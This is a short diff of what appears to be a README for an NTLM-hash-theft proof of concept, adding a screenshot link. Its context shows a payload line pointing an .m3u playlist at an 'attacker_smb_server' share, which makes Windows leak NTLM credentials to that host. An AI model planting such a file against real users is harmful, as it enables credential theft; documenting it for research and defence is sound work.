@@ -30,6 +30,8 @@ PoC :
 \\attacker_smb_server\ROPNOP
 
 Save it as m3u extention.
+![](https://github.com/kofa2002/NTLM-THEFT/blob/master/M3U.PNG)
+
 
 ![](https://github.com/kofa2002/NTLM-THEFT/blob/master/Screenshot%20from%202019-05-04%2008-11-15.png)
 
